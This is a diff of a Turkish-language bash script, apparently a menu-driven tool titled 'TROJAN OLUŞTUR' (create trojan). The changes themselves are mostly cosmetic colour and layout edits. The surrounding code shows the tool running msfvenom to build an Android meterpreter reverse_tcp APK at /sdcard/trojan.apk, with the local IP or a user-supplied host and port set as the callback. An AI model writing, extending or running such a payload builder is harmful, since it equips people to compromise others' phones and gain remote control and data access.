@@ -13,14 +13,17 @@ fi
 clear
 echo
 echo
-printf "\e[31m////////////////////\e[97m TROJAN OLUŞTUR \e[31m////////////////////\e[97m"
+echo
+echo
+printf "\e[32m████████████████████  \e[1;4;33mTROJAN OLUŞTUR\e[0;32m  █████████████████████\e[97m"
+echo
 echo
 echo
 echo
 printf "
-\e[31m[\e[97m1\e[31m]\e[97m ────────── \e[32mAĞ İÇİ APK OLUŞTUR\e[97m
+        \e[31m[\e[97m1\e[31m]\e[97m ────────── \e[32mAĞ İÇİ APK OLUŞTUR\e[97m
 
-\e[31m[\e[97m2\e[31m]\e[97m ────────── \e[32mAĞ DIŞI APK OLUŞTUR\e[97m
+        \e[31m[\e[97m2\e[31m]\e[97m ────────── \e[32mAĞ DIŞI APK OLUŞTUR\e[97m
 "
 echo
 echo
@@ -46,6 +49,7 @@ if [[ $secim == 1 ]];then
 		sleep 0.5
 		ip=$(ifconfig |grep broadcast |awk {'print $2'})
 		echo -e "$ip\n4444" > ağ.txt
+		printf "\e[32m"
 		msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=4444 R > /sdcard/trojan.apk
 		echo
 		echo
@@ -97,6 +101,7 @@ elif [[ $secim == 2 ]];then
 			rm tcp
 			ip=$(sed -n 1p ağ.txt)
 			port=$(sed -n 3p ağ.txt)
+			printf "\e[32m"
 			msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$port R > /sdcard/trojan.apk
 			echo
 			echo
